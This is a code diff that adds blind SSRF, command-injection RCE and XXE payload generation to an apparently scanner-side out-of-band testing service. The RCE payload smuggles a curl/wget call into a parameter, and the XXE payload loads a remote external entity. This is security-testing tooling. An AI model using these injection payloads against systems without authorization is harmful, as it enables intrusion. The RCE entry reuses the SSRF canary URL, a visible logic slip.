@@ -132,4 +132,35 @@ export class OastService {
   public static getActiveInteractions(scanId: number): OastInteraction[] {
     return Array.from(activeOastTokens.values()).filter((i) => i.scanId === scanId);
   }
+
+  /**
+   * Generates a suite of OAST payloads for parameter injection
+   */
+  public static generatePayloadSuite(scanId: number, targetUrl: string, paramName: string) {
+    const ssrfCanary = this.generateCanary(scanId, targetUrl, 'BLIND_SSRF', paramName);
+    const rceCanary = this.generateCanary(scanId, targetUrl, 'BLIND_RCE', paramName);
+    const xxeCanary = this.generateCanary(scanId, targetUrl, 'BLIND_XXE', paramName);
+
+    return {
+      ssrf: {
+        token: ssrfCanary.token,
+        payload: ssrfCanary.httpPayload,
+      },
+      rce: {
+        token: rceCanary.token,
+        payload: `; curl -s "${ssrfCanary.httpPayload}" || wget -q -O- "${ssrfCanary.httpPayload}" ;`,
+      },
+      xxe: {
+        token: xxeCanary.token,
+        payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "${xxeCanary.httpPayload}">%remote;]>`,
+      },
+    };
+  }
+
+  /**
+   * Clear in-memory token state
+   */
+  public static clearState() {
+    activeOastTokens.clear();
+  }
 }
